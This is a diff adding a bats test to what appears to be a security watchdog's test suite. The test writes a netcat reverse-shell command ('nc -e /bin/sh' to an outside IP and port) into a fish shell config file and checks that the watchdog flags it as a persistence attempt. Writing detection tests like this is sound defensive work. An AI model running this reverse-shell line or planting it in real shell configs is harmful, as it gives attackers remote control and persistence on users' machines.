@@ -248,3 +248,15 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in fish config: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. Fish-shell config files (config.fish +
+    # conf.d/*.fish) source AS THE USER on every interactive shell
+    # start — a per-login user-exec persistence surface (T1546).
+    # Sister-vector to bash-completion + csh-config + shell-init on
+    # the per-login-source-surface family.
+    printf 'nc -e /bin/sh 1.1.1.1 4444\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
